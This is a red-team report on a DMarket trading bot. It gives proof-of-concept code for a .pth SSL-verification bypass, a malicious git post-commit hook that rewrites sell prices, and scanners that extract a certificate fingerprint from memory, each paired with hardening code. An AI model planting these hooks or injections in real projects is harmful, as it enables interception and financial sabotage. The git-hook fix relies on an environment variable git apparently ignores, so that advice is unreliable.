# 🔴 RED TEAM REPORT: Logical Vulnerabilities & Bypass Vectors

**Classification:** INTERNAL — Red Team Exercise  
**Date:** 2026-03-08  
**Analyst:** Red Team Lead (Reverse Engineering & Python Runtime Bypass)  
**Target:** OpenClaw Framework + DMarket Bot (Phase 11 hardened build)

---

## Vector 1: TLS Pinning Bypass via Runtime Library Injection

### Vulnerability

The `@secure_request` decorator relies on `ssl.create_default_context()` to validate certificates. In the WSL environment, an attacker with local filesystem access can **replace the CA bundle** or **monkey-patch the ssl module at import time** without modifying `dmarket_api_client.py` itself.

### Attack Path

```
Attacker has write access to D:\Dmarket_bot\ (same machine)
   ↓
Option A: Drop a malicious ssl.py into D:\Dmarket_bot\src\
   → Python resolves "import ssl" from local src/ BEFORE stdlib
   → Malicious ssl module returns attacker-controlled certs
   ↓
Option B: Inject a .pth file into site-packages/
   → .pth files auto-execute at interpreter startup
   → Monkey-patch ssl.SSLSocket.getpeercert to return a static cert
   ↓
TLS Pinning check always passes ✅ → MITM traffic interception
```

### PoC: Malicious `.pth` injection

```python
# File: inject_ssl_bypass.pth
# Drop into: /mnt/d/openclaw_bot/openclaw_bot/venv/lib/python3.12/site-packages/
# Content (single line — .pth files execute lines starting with "import"):
import ssl; _orig = ssl.SSLSocket.getpeercert; ssl.SSLSocket.getpeercert = lambda self, binary_form=False: _orig(self, binary_form) if not binary_form else b'\x00' * 32
```

### Why it works

- Python's `.pth` file execution is a **documented feature**, not an exploit.
- The `DMARKET_CERT_FINGERPRINT` is stored as a **module-level global** (`None` by default), so even if pinning is enabled, the attacker can also simply write: `import src.dmarket_api_client; src.dmarket_api_client.DMARKET_CERT_FINGERPRINT = None` from any co-loaded module.

### Phase 13 Hardening

```python
# DEFENSE: Freeze the fingerprint as an immutable constant
import types

def _freeze_module_constants(module):
    """Prevent runtime mutation of security-critical module globals."""
    original_setattr = module.__class__.__setattr__
    frozen_keys = {"DMARKET_CERT_FINGERPRINT", "JITTER_SAFE_MIN", "JITTER_SAFE_MAX"}

    def guarded_setattr(self, key, value):
        if key in frozen_keys:
            raise SecurityViolation(f"Attempt to mutate frozen constant: {key}")
        return original_setattr(self, key, value)

    module.__class__ = type(
        module.__class__.__name__,
        (module.__class__,),
        {"__setattr__": guarded_setattr},
    )

# Additionally: verify ssl module origin at startup
import ssl as _ssl
import pathlib
_ssl_origin = pathlib.Path(_ssl.__file__).resolve()
if "site-packages" in str(_ssl_origin) or "src" in str(_ssl_origin):
    raise SecurityViolation(f"ssl module loaded from untrusted path: {_ssl_origin}")
```

---

## Vector 2: AutoRollback Git-Index Poisoning

### Vulnerability

The `AutoRollback` class trusts `git` unconditionally. Two critical flaws:

1. **No SHA integrity verification** — `create_checkpoint()` stores a SHA in `self._checkpoint_sha` (a Python instance variable), but never signs it. An attacker who can execute code in the same process can simply overwrite `self._checkpoint_sha` to point at a **malicious commit**.

2. **No `.git/hooks` protection** — An attacker can drop a `post-commit` or `pre-commit` hook into `.git/hooks/` that silently amends the checkpoint commit to include malicious code. Since `validate_files()` only checks **syntax** (`py_compile`), a semantically malicious but syntactically valid payload passes undetected.

### Attack Path

```
Attacker creates a syntactically valid but malicious file:
   def calculate_sell_price(buy_price, profit_pct=0.02):
       return 0.01  # Always sell at 1 cent → guaranteed loss

   ↓
Attacker drops a .git/hooks/post-commit script that:
   1. Amends the [AutoRollback] commit with the malicious file
   2. Updates HEAD to the amended SHA
   ↓
AutoRollback.create_checkpoint() returns the POISONED SHA
   ↓
validate_files() passes (valid syntax)
   ↓
rollback() restores to the POISONED checkpoint
   ↓
Bot sells all inventory at $0.01
```

### PoC: Malicious `post-commit` hook

```bash
#!/bin/bash
# File: D:\openclaw_bot\openclaw_bot\.git\hooks\post-commit
# Silently inject malicious sell logic into the checkpoint

if git log -1 --format='%s' | grep -q '\[AutoRollback\]'; then
    # Replace sell price calculation with a loss-maker
    sed -i 's/return round((buy_price \/ 0.95)/return round((0.01/' \
        src/inventory_manager.py 2>/dev/null || true
    git add -A
    git commit --amend --no-edit --quiet
fi
```

### Phase 13 Hardening

```python
# DEFENSE 1: Sign checkpoints with HMAC
import hmac
import hashlib

class SecureAutoRollback(AutoRollback):
    """AutoRollback with HMAC-signed checkpoint SHAs."""

    def __init__(self, repo_path: str, signing_secret: bytes):
        super().__init__(repo_path)
        self._secret = signing_secret

    def create_checkpoint(self, message="auto-checkpoint"):
        sha = super().create_checkpoint(message)
        self._checkpoint_mac = hmac.new(
            self._secret, sha.encode(), hashlib.sha256
        ).hexdigest()
        return sha

    def rollback(self):
        if not self._checkpoint_sha or not self._checkpoint_mac:
            return False
        expected = hmac.new(
            self._secret, self._checkpoint_sha.encode(), hashlib.sha256
        ).hexdigest()
        if not hmac.compare_digest(expected, self._checkpoint_mac):
            raise SecurityViolation("Checkpoint SHA tampering detected!")
        return super().rollback()

# DEFENSE 2: Disable git hooks in AutoRollback subprocess calls
# Add to _git(): env={"GIT_HOOKS_PATH": "/dev/null"}
def _git(self, *args):
    env = os.environ.copy()
    env["GIT_HOOKS_PATH"] = "/dev/null"
    result = subprocess.run(
        ["git", *args],
        cwd=self.repo_path,
        capture_output=True, text=True, timeout=30,
        env=env,
    )
    return result.stdout
```

---

## Vector 3: Data Poisoning via Scanner Price Manipulation

### Vulnerability

The Scanner v2.0 pulls `best_bid` and `best_ask` from DMarket's **public** API endpoints. The `@secure_request` decorator validates the **transport** (TLS, URL, jitter) but **never validates the data payload**. The Inventory Manager's `calculate_sell_price()` has a critical **integer parsing flaw** at line 91:

```python
buy_price_cents = int(str(raw_price).replace(".", "").replace(",", ""))
```

### Attack Path

An attacker who controls a DMarket listing (by creating a crafted sell order at an extreme price) can inject a price like `"0.01"` into the order book. The flow:

```
Attacker lists "AK-47 | Slate (FT)" at Ask = $0.01 (1 cent)
   ↓
Scanner fetches: best_ask = 0.01, best_bid = 5.00
   ↓
raw_profit = (5.00 * 0.95) - 0.01 = $4.74 (475x return!!! 🚀)
   ↓
DeepSeek data_parsing: "VALID" (profit looks real)
   ↓
Arkady risk_analysis: "BUY" (massive spread)
   ↓
Bot buys at $0.01 ← This part is fine (cheap buy)
   ↓ 
BUT: Attacker CANCELS their $0.01 listing before fill
   ↓
Bot now holds a skin with no liquidity to sell
   ↓
Inventory Manager calculates sell_price from buy_price $0.01:
   (0.01 / 0.95) + (0.01 * 0.02) = $0.0125
   ↓
Bot lists the skin at $0.01 → LOSS (bought through order book spread)
```

**Worse scenario:** If `raw_price` arrives as string `"1e5"` (scientific notation), the `.replace(".", "")` produces `"1e5"` → `int("1e5")` → **ValueError** → `buy_price_cents = 0` → `sell_price = $0.00` → **free item giveaway**.

### Phase 13 Hardening

```python
# DEFENSE: Price sanity validator
MIN_SKIN_PRICE_USD = 0.10   # Nothing legitimate costs less than 10 cents
MAX_SKIN_PRICE_USD = 50000  # CS2 knife cap

def validate_price(price_usd: float, skin_name: str) -> bool:
    """Reject prices outside the sane market range."""
    if not isinstance(price_usd, (int, float)):
        raise SecurityViolation(f"Non-numeric price for {skin_name}: {price_usd}")
    if price_usd < MIN_SKIN_PRICE_USD:
        raise SecurityViolation(
            f"Price ${price_usd} below floor ${MIN_SKIN_PRICE_USD} for {skin_name}. "
            f"Possible bait listing."
        )
    if price_usd > MAX_SKIN_PRICE_USD:
        raise SecurityViolation(f"Price ${price_usd} above ceiling for {skin_name}")
    return True

# Apply in Scanner BEFORE passing to AI:
validate_price(best_ask, skin)
validate_price(best_bid, skin)

# Fix integer parsing vulnerability:
# BEFORE (vulnerable):
buy_price_cents = int(str(raw_price).replace(".", "").replace(",", ""))
# AFTER (safe):
buy_price_usd = float(raw_price)  # handles "1e5", "0.01", etc.
if not (MIN_SKIN_PRICE_USD <= buy_price_usd <= MAX_SKIN_PRICE_USD):
    raise SecurityViolation(f"Anomalous buy price: ${buy_price_usd}")
```

---

## Vector 4: Memory Extraction of DMARKET_CERT_FINGERPRINT

### Vulnerability

`DMARKET_CERT_FINGERPRINT` is a **module-level Python global variable**. In CPython, all module globals are stored in the module's `__dict__`, which resides in the heap. Any code running in the same process — including MCP tool plugins, imported libraries, or injected `.pth` files — can trivially read it.

Additionally, since the bot runs under WSL which shares the Windows kernel, a Windows-side process with the same user privileges can use `ReadProcessMemory()` to scan the WSL process heap.

### PoC: In-process extraction (zero dependencies)

```python
"""
poc_extract_fingerprint.py

Demonstrates trivial extraction of the TLS pinning fingerprint
from a co-running module's namespace.

This would be injected via a malicious MCP tool, a compromised
pip package, or a .pth startup hook.
"""
import sys
import importlib


def extract_cert_fingerprint() -> str:
    """
    Extract DMARKET_CERT_FINGERPRINT from the dmarket_api_client
    module if it's already loaded, or force-load it.
    """
    module_name = "src.dmarket_api_client"

    # Method 1: Check if already imported
    if module_name in sys.modules:
        mod = sys.modules[module_name]
        fp = getattr(mod, "DMARKET_CERT_FINGERPRINT", None)
        return f"[LIVE] Fingerprint: {fp}"

    # Method 2: Force import (won't trigger __init__ side effects
    # if the module is pure-definition)
    try:
        mod = importlib.import_module(module_name)
        fp = getattr(mod, "DMARKET_CERT_FINGERPRINT", None)
        return f"[LOADED] Fingerprint: {fp}"
    except ImportError:
        pass

    # Method 3: Scan ALL loaded modules for the variable name
    for name, mod in sys.modules.items():
        fp = getattr(mod, "DMARKET_CERT_FINGERPRINT", None)
        if fp is not None:
            return f"[SCAN:{name}] Fingerprint: {fp}"

    return "[MISS] Fingerprint not found in any loaded module"


if __name__ == "__main__":
    print(extract_cert_fingerprint())
```

### PoC: Cross-process extraction from Windows (ReadProcessMemory)

```python
"""
poc_winapi_extract.py

Scans WSL process memory for a SHA-256 hex fingerprint pattern.
Requires: ctypes, same-user privileges, WSL process PID.
NOTE: This is a CONCEPTUAL PoC for the audit report.
"""
import ctypes
import ctypes.wintypes
import re

PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
SHA256_HEX_PATTERN = rb'[0-9a-f]{64}'


def scan_process_memory(pid: int) -> list:
    """Scan a process's readable memory regions for SHA-256 hex strings."""
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid
    )
    if not handle:
        return ["ERROR: Cannot open process"]

    findings = []

    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("BaseAddress", ctypes.c_void_p),
            ("AllocationBase", ctypes.c_void_p),
            ("AllocationProtect", ctypes.wintypes.DWORD),
            ("RegionSize", ctypes.c_size_t),
            ("State", ctypes.wintypes.DWORD),
            ("Protect", ctypes.wintypes.DWORD),
            ("Type", ctypes.wintypes.DWORD),
        ]

    mbi = MEMORY_BASIC_INFORMATION()
    address = 0

    while address < 0x7FFFFFFFFFFF:
        if kernel32.VirtualQueryEx(handle, address, ctypes.byref(mbi), ctypes.sizeof(mbi)) == 0:
            break

        # Only scan committed, readable regions
        MEM_COMMIT = 0x1000
        PAGE_READABLE = {0x02, 0x04, 0x20, 0x40}
        if mbi.State == MEM_COMMIT and mbi.Protect in PAGE_READABLE:
            buf = ctypes.create_string_buffer(mbi.RegionSize)
            bytes_read = ctypes.c_size_t(0)
            if kernel32.ReadProcessMemory(handle, address, buf, mbi.RegionSize, ctypes.byref(bytes_read)):
                matches = re.findall(SHA256_HEX_PATTERN, buf.raw[:bytes_read.value])
                for m in matches:
                    findings.append(f"0x{address:016x}: {m.decode()}")

        address += mbi.RegionSize

    kernel32.CloseHandle(handle)
    return findings


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python poc_winapi_extract.py <PID>")
    else:
        for finding in scan_process_memory(int(sys.argv[1])):
            print(finding)
```

### Phase 13 Hardening

```python
# DEFENSE: Store fingerprint in OS keyring, never in module globals
import keyring

def get_pinned_fingerprint() -> str:
    """Retrieve cert fingerprint from OS credential store, not Python memory."""
    fp = keyring.get_password("dmarket_bot", "cert_fingerprint")
    if not fp:
        raise SecurityViolation("TLS fingerprint not found in OS keyring")
    return fp

# Delete the module-level global entirely:
# BEFORE: DMARKET_CERT_FINGERPRINT = "abc123..."
# AFTER:  (removed — fetched on-demand from keyring inside the decorator)
```

---

## Consolidated Phase 13 Hardening Roadmap

| # | Defense | Blocks Vector | Priority |
|---|---------|---------------|----------|
| 1 | Verify `ssl.__file__` origin at startup | V1 (Library injection) | 🔴 CRITICAL |
| 2 | Freeze security constants via `__setattr__` guard | V1 (Runtime mutation) | 🔴 CRITICAL |
| 3 | HMAC-sign checkpoint SHAs | V2 (Git poisoning) | 🟠 HIGH |
| 4 | Disable git hooks in AutoRollback subprocess | V2 (Hook injection) | 🟠 HIGH |
| 5 | Price floor/ceiling validator before AI | V3 (Data poisoning) | 🔴 CRITICAL |
| 6 | Fix `int()` parsing of scientific notation | V3 (Price overflow) | 🔴 CRITICAL |
| 7 | Move cert fingerprint to OS keyring | V4 (Memory extraction) | 🟠 HIGH |
| 8 | Restrict `.pth` file execution in venv | V1, V4 | 🟡 MEDIUM |
| 9 | Add Telegram circuit-breaker alerts | V3 (DoS awareness) | 🟡 MEDIUM |
